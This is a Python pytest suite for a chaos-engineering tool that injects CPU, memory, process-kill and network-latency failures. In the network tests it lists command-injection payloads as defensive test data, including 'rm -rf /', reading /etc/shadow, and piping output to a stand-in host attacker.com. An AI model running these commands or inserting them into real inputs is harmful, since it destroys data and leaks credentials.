"""Tests for failure injection modules."""

import pytest
import time
import psutil
import os
from unittest.mock import patch, MagicMock
from src.failures.cpu import inject_cpu
from src.failures.memory import inject_memory
from src.failures.process import inject_process, get_safe_target_processes
from src.failures.network import inject_network, cleanup_network_rules
from src.metrics import INJECTIONS_TOTAL, INJECTION_ACTIVE


class TestCPUFailures:
    """Test CPU failure injection."""

    @pytest.mark.parametrize("cores", [1, 2, 4])
    def test_inject_cpu_dry_run(self, cores, capsys):
        """Test CPU injection in dry run mode."""
        config = {
            "duration_seconds": 1,
            "cores": cores,
        }
        inject_cpu(config, dry_run=True)
        captured = capsys.readouterr()
        assert f"DRY RUN] Would hog {cores} CPU" in captured.out
        assert (
            INJECTIONS_TOTAL.labels(failure_type="cpu", status="skipped")._value.get()
            == 1
        )

    def test_inject_cpu_actual(self, capsys):
        """Test actual CPU injection (brief to avoid slowdown)."""
        config = {
            "duration_seconds": 1,
            "cores": 1,
        }
        start_time = time.time()
        inject_cpu(config, dry_run=False)
        duration = time.time() - start_time

        captured = capsys.readouterr()
        assert "[CPU] Hogging" in captured.out
        assert duration >= 1  # Should take at least 1 second
        assert (
            INJECTIONS_TOTAL.labels(failure_type="cpu", status="success")._value.get()
            == 1
        )

    def test_inject_cpu_default_cores(self, capsys):
        """Test CPU injection with default cores value."""
        config = {"duration_seconds": 1}
        inject_cpu(config, dry_run=True)
        captured = capsys.readouterr()
        assert "1 CPU core(s)" in captured.out

    def test_inject_cpu_metrics(self):
        """Test that CPU injection updates metrics correctly."""
        config = {"duration_seconds": 1, "cores": 1}

        inject_cpu(config, dry_run=False)

        # After completion, active should be back to 0
        final_active = INJECTION_ACTIVE.labels(failure_type="cpu")._value.get()
        assert final_active == 0

        # Success counter should have incremented
        assert (
            INJECTIONS_TOTAL.labels(failure_type="cpu", status="success")._value.get()
            == 1
        )

    def test_cpu_zero_duration(self, capsys):
        """Test CPU injection with zero duration."""
        config = {"duration_seconds": 0, "cores": 1}
        inject_cpu(config, dry_run=False)
        # Should complete immediately without error
        captured = capsys.readouterr()
        assert "[CPU] Hogging" in captured.out

    def test_inject_cpu_metrics_correct_order(self):
        """Test that CPU injection updates metrics in correct order."""
        config = {"duration_seconds": 1, "cores": 1}

        # Before injection
        assert INJECTION_ACTIVE.labels(failure_type="cpu")._value.get() == 0
        assert (
            INJECTIONS_TOTAL.labels(failure_type="cpu", status="success")._value.get()
            == 0
        )

        inject_cpu(config, dry_run=False)

        # After successful injection
        assert INJECTION_ACTIVE.labels(failure_type="cpu")._value.get() == 0
        assert (
            INJECTIONS_TOTAL.labels(failure_type="cpu", status="success")._value.get()
            == 1
        )


class TestMemoryFailures:
    """Test memory failure injection."""

    def test_inject_memory_dry_run(self, capsys):
        """Test memory injection in dry run mode."""
        config = {"duration_seconds": 1, "mb": 50}
        inject_memory(config, dry_run=True)
        captured = capsys.readouterr()
        assert "DRY RUN] Would allocate 50 MB" in captured.out
        assert (
            INJECTIONS_TOTAL.labels(
                failure_type="memory", status="skipped"
            )._value.get()
            == 1
        )

    @pytest.mark.parametrize("mb", [10, 50, 100])
    def test_inject_memory_various_sizes(self, mb, capsys):
        """Test memory injection with different sizes in dry run."""
        config = {"duration_seconds": 1, "mb": mb}
        inject_memory(config, dry_run=True)
        captured = capsys.readouterr()
        assert f"Would allocate {mb} MB" in captured.out

    def test_inject_memory_actual_small(self, capsys):
        """Test actual memory injection with small allocation."""
        config = {"duration_seconds": 1, "mb": 10}
        inject_memory(config, dry_run=False)
        time.sleep(1.5)  # Wait for thread to complete

        captured = capsys.readouterr()
        assert "[MEMORY] Starting memory injection" in captured.out
        # Check that it eventually completes
        assert (
            INJECTIONS_TOTAL.labels(
                failure_type="memory", status="success"
            )._value.get()
            == 1
        )

    def test_inject_memory_default_value(self, capsys):
        """Test memory injection with default MB value."""
        config = {"duration_seconds": 1}
        inject_memory(config, dry_run=True)
        captured = capsys.readouterr()
        assert "100 MB" in captured.out  # Default is 100

    def test_inject_memory_threaded_behavior(self):
        """Test that memory injection doesn't block the main thread."""
        config = {"duration_seconds": 2, "mb": 10}

        start = time.time()
        inject_memory(config, dry_run=False)
        elapsed = time.time() - start

        # Should return immediately (not block for 2 seconds)
        assert elapsed < 0.5

    def test_memory_zero_size(self, capsys):
        """Test memory injection with zero MB."""
        config = {"duration_seconds": 1, "mb": 0}
        inject_memory(config, dry_run=True)
        captured = capsys.readouterr()
        assert "0 MB" in captured.out


class TestProcessFailures:
    """Test process failure injection."""

    def test_inject_process_dry_run(self, capsys):
        """Test process kill in dry run mode."""
        config = {"target_name": "python"}
        inject_process(config, dry_run=True)
        captured = capsys.readouterr()
        # Should either find process or report none found
        assert "DRY RUN" in captured.out or "No killable process" in captured.out

    def test_inject_process_no_target_name(self, capsys):
        """Test process injection without target name."""
        config = {}
        inject_process(config, dry_run=False)
        captured = capsys.readouterr()
        assert "No target_name specified" in captured.out

    def test_inject_process_nonexistent_target(self, capsys):
        """Test process injection with nonexistent target."""
        config = {"target_name": "definitely_not_a_real_process_name_xyz123"}
        inject_process(config, dry_run=False)
        captured = capsys.readouterr()
        assert "No killable process" in captured.out
        assert (
            INJECTIONS_TOTAL.labels(
                failure_type="process", status="skipped"
            )._value.get()
            == 1
        )

    def test_get_safe_target_processes_excludes_self(self):
        """Test that safe target processes excludes the chaos agent itself."""
        # Get our own process name
        current_process = psutil.Process(os.getpid())
        current_name = current_process.name()

        # Try to find processes with our name
        safe_targets = get_safe_target_processes(current_name)

        # Should not include our own PID
        my_pid = os.getpid()
        target_pids = [p.pid for p in safe_targets]
        assert my_pid not in target_pids

    def test_get_safe_target_processes_excludes_chaos_agent(self):
        """Test that processes with 'chaos' or 'agent.py' in cmdline are excluded."""
        # This is a meta-test - we're running as part of the test suite
        # so we shouldn't target ourselves even if searching for 'python'
        safe_targets = get_safe_target_processes("python")

        my_pid = os.getpid()
        for proc in safe_targets:
            assert proc.pid != my_pid
            cmdline = " ".join(proc.info.get("cmdline", []))
            # Processes with 'chaos' or 'agent.py' should be filtered
            if "agent.py" in cmdline:
                assert proc.pid != my_pid

    def test_process_empty_target_name(self, capsys):
        """Test process injection with empty target name."""
        config = {"target_name": ""}
        inject_process(config, dry_run=False)
        captured = capsys.readouterr()
        # Empty string should be treated as no target
        assert "No killable process" in captured.out or "No target_name" in captured.out


class TestNetworkFailures:
    """Test network failure injection."""

    @patch("src.failures.network._run_cmd")
    def test_inject_network_dry_run(self, mock_run_cmd, capsys):
        """Test network injection in dry run mode."""
        config = {"interface": "eth0", "delay_ms": 100, "duration_seconds": 1}
        inject_network(config, dry_run=True)
        captured = capsys.readouterr()
        assert "DRY RUN] Would add 100ms latency" in captured.out
        assert (
            INJECTIONS_TOTAL.labels(
                failure_type="network", status="skipped"
            )._value.get()
            == 1
        )
        # Should not execute any commands in dry run
        mock_run_cmd.assert_not_called()

    @patch("src.failures.network._run_cmd")
    def test_inject_network_success(self, mock_run_cmd, capsys):
        """Test successful network injection."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_run_cmd.return_value = mock_result

        config = {"interface": "eth0", "delay_ms": 200, "duration_seconds": 1}

        inject_network(config, dry_run=False)

        captured = capsys.readouterr()
        assert "[NETWORK] Adding 200ms latency" in captured.out
        assert "[NETWORK] Cleaned up latency" in captured.out
        assert (
            INJECTIONS_TOTAL.labels(
                failure_type="network", status="success"
            )._value.get()
            == 1
        )

    @patch("src.failures.network._run_cmd")
    def test_inject_network_failure(self, mock_run_cmd, capsys):
        """Test network injection failure handling."""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = "Operation not permitted"
        mock_run_cmd.return_value = mock_result

        config = {"interface": "eth0", "delay_ms": 100, "duration_seconds": 1}

        inject_network(config, dry_run=False)

        captured = capsys.readouterr()
        assert "[NETWORK] Failed:" in captured.out
        assert (
            INJECTIONS_TOTAL.labels(
                failure_type="network", status="failed"
            )._value.get()
            == 1
        )

    @patch("src.failures.network._run_cmd")
    def test_inject_network_default_interface(self, mock_run_cmd, capsys):
        """Test network injection with default interface."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run_cmd.return_value = mock_result

        config = {"delay_ms": 150, "duration_seconds": 1}

        inject_network(config, dry_run=True)
        captured = capsys.readouterr()
        assert "eth0" in captured.out  # Default interface

    @patch("src.failures.network._run_cmd")
    def test_cleanup_network_rules(self, mock_run_cmd):
        """Test network cleanup function."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run_cmd.return_value = mock_result

        cleanup_network_rules("eth0")

        # Should call tc qdisc del command
        mock_run_cmd.assert_called_once()
        call_args = mock_run_cmd.call_args[0][0]
        assert set(["tc", "qdisc", "del", "eth0"]).issubset(call_args)

    @patch("src.failures.network._run_cmd")
    def test_inject_network_always_cleans_up(self, mock_run_cmd, capsys):
        """Test that network injection always cleans up, even on failure."""
        # First call (cleanup) succeeds, second call (add) fails, third call (cleanup) succeeds
        mock_result_success = MagicMock()
        mock_result_success.returncode = 0

        mock_result_fail = MagicMock()
        mock_result_fail.returncode = 1
        mock_result_fail.stderr = "Error"

        mock_run_cmd.side_effect = [
            mock_result_success,
            mock_result_fail,
            mock_result_success,
        ]

        config = {"interface": "eth0", "delay_ms": 100, "duration_seconds": 1}

        inject_network(config, dry_run=False)

        # Should have been called 3 times: initial cleanup, add (fails), final cleanup
        assert mock_run_cmd.call_count == 3

        captured = capsys.readouterr()
        assert "[NETWORK] Cleaned up latency" in captured.out

    @patch("src.failures.network._run_cmd")
    def test_network_zero_delay(self, mock_run_cmd, capsys):
        """Test network injection with zero delay."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run_cmd.return_value = mock_result

        config = {"delay_ms": 0, "duration_seconds": 1}
        inject_network(config, dry_run=True)
        captured = capsys.readouterr()
        assert "0ms latency" in captured.out

    @patch("src.failures.network._run_cmd")
    def test_cleanup_network_rules_success(self, mock_run_cmd):
        """Test successful cleanup returns True."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stderr = ""
        mock_run_cmd.return_value = mock_result

        success, error = cleanup_network_rules("eth0")
        assert success is True
        assert error is None

    @patch("src.failures.network._run_cmd")
    def test_cleanup_network_rules_no_rules_exist(self, mock_run_cmd):
        """Test cleanup when no rules exist (benign error)."""
        mock_result = MagicMock()
        mock_result.returncode = 2
        mock_result.stderr = "RTNETLINK answers: No such file or directory"
        mock_run_cmd.return_value = mock_result

        success, error = cleanup_network_rules("eth0")
        assert success is True  # This is expected, not an error
        assert error is None

    @patch("src.failures.network._run_cmd")
    def test_cleanup_network_rules_invalid_interface(self, mock_run_cmd):
        """Test cleanup with invalid interface."""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = "Cannot find device 'eth999'"
        mock_run_cmd.return_value = mock_result

        success, error = cleanup_network_rules("eth999")
        assert success is False
        assert "Cannot find device" in error

    @patch("src.failures.network._run_cmd")
    def test_cleanup_network_rules_no_permissions(self, mock_run_cmd):
        """Test cleanup without NET_ADMIN capability."""
        mock_result = MagicMock()
        mock_result.returncode = 1
        mock_result.stderr = "Operation not permitted"
        mock_run_cmd.return_value = mock_result

        success, error = cleanup_network_rules("eth0")
        assert success is False
        assert "Operation not permitted" in error

    def test_validate_interface_blocks_command_injection(self):
        """Test that command injection attempts are blocked."""
        from src.failures.network import validate_interface_name
        
        malicious_inputs = [
            "eth0; rm -rf /",
            "eth0 && cat /etc/passwd",
            "eth0 | nc attacker.com 1234",
            "eth0`whoami`",
            "eth0$(cat /etc/shadow)",
            "eth0 > /tmp/pwned",
            "eth0\nrm -rf /",
            "eth0; curl http://evil.com",
        ]
        
        for malicious in malicious_inputs:
            is_valid, error = validate_interface_name(malicious)
            assert is_valid is False, f"Should reject: {malicious}"
            assert error is not None
    
    def test_validate_interface_allows_valid_names(self):
        """Test that valid interface names are accepted."""
        from src.failures.network import validate_interface_name
        
        valid_inputs = [
            "eth0",
            "wlan0",
            "ens33",
            "br-1234abcd",
            "veth0.1",
            "eth0:1",
            "docker0",
        ]
        
        for valid in valid_inputs:
            is_valid, error = validate_interface_name(valid)
            assert is_valid is True, f"Should accept: {valid}"
            assert error is None
    
    def test_validate_delay_blocks_invalid_values(self):
        """Test that invalid delay values are rejected."""
        from src.failures.network import validate_delay_ms
        
        invalid_inputs = [
            -1,
            -100,
            20000,  # Too high
            "100ms",  # String
            None,
            [],
        ]
        
        for invalid in invalid_inputs:
            is_valid, error = validate_delay_ms(invalid)
            assert is_valid is False
            assert error is not None
    
    @patch("src.failures.network._run_cmd")
    def test_inject_network_rejects_malicious_interface(self, mock_cmd, capsys):
        """Test that network injection rejects command injection."""
        config = {
            "interface": "eth0; rm -rf /",
            "delay_ms": 100,
            "duration_seconds": 1
        }
        
        inject_network(config, dry_run=False)
        
        # Should not execute any commands
        mock_cmd.assert_not_called()
        
        # Should log validation failure
        captured = capsys.readouterr()
        assert "Validation failed" in captured.out
